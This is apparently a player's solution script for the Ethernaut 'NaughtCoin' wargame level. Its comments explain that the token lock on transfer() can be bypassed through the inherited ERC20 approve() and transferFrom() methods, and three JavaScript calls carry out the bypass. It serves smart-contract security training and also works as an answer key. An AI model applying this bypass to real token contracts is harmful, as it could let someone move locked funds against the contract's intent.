// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x8a518EE4dE2C4358C265643aF6A3687f631e0345

// solution

// because the NaughtCoin contract its inheriting the ERC20 token contract
// you can use the methods defined there, not only the defined in the NaughtCoin
// so instead using transfer() you can use transferFrom() increasing the
// transfer amount allowance prior to that

// i got the balance using Remix IDE
const balance = await contract.balanceOf('0x0718eccf37de50e31620C658B2c96adDc1e76300');
await contract.approve('0x0718eccf37de50e31620C658B2c96adDc1e76300', balance + 1);
await contract.transferFrom('0x0718eccf37de50e31620C658B2c96adDc1e76300', '0x8a518EE4dE2C4358C265643aF6A3687f631e0345', balance);